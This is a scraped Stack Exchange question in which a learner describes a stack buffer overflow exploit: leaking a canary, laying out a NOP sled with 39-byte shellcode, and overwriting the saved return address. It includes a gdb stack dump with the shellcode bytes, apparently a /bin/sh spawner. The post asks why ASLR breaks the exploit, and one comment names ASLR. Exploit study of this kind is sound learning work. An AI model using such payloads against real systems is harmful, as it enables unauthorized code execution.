{
  "title": "Invalid address when overwriting saved rip with buffer's address",
  "link": "https://reverseengineering.stackexchange.com/questions/31081/invalid-address-when-overwriting-saved-rip-with-buffers-address",
  "content": "I have an executable vulnerable to buffer overflows. The program takes a buffer of 104 chars and prints it (unfortunately, there is no format string vulnerability) until we feed it with a 0 or a   \n, in that case it just exits.\n\nThe program adopts a stack canary mitigation, so I am trying to leak it in order to inject a shellcode. To do so I:\n\n```\nNOPx65 + shellcode (39 bytes long) + leaked_canary + \"bbbbbbbb\" (used to fill the space between canary and sRIP) + <buff_address>\n\n```\nThis is the stack after sending the payload and pressing enter to stop the execution.\n\n```\n0x7ffd2a5d6e80: 0x909090909090900a             0x9090909090909090\n0x7ffd2a5d6e90: 0x9090909090909090             0x9090909090909090\n0x7ffd2a5d6ea0: 0x9090909090909090             0x9090909090909090\n0x7ffd2a5d6eb0: 0x9090909090909090             0x9090909090909090    <-end of NOP sled\n0x7ffd2a5d6ec0: 0x48fe89485f12eb90             0x3bb8f2894808c683    <-shellcode\n0x7ffd2a5d6ed0: 0xffe9e8050f000000             0x732f6e69622fffff \n0x7ffd2a5d6ee0: 0x0000000000000068             0xdfcedb209c33f900    <-leaked canary\n0x7ffd2a5d6ef0: 0x6262626262626262  <-filler   0x00007fffffffddc0    <-sRIP overwritten with buf_address\n\n```\nAs you can see, at the end of the snippet there is the sRIP overwritten with the buffer address I got from the previous execution. (That means that I launched the first overflow, and I used gdb to find where the buffer resides in memory, that's where I got <0x00007fffffffddc0>).\n\nThe problem here is that the address above changes as the stack is always random. I think that is the reason why, at the end of the execution I get:\n\n```\nInvalid address 0x7fffffffddc0\n\n```\nand the program sigfaults.\nI need to build a strategy, but I am too inexperienced with this topic. How can I get away with this issue?\n\n",
  "votes": "2",
  "answers": 0,
  "views": "92",
  "tags": [
    "buffer-overflow",
    "shellcode",
    "stack-protector"
  ],
  "user": "Jacob",
  "time": "Nov 4, 2022 at 10:49",
  "comments": [
    {
      "user": "Mega Tonnage",
      "text": "So it seems you're up against ASLR, time to do some reading.",
      "time": null
    }
  ],
  "answers_data": []
}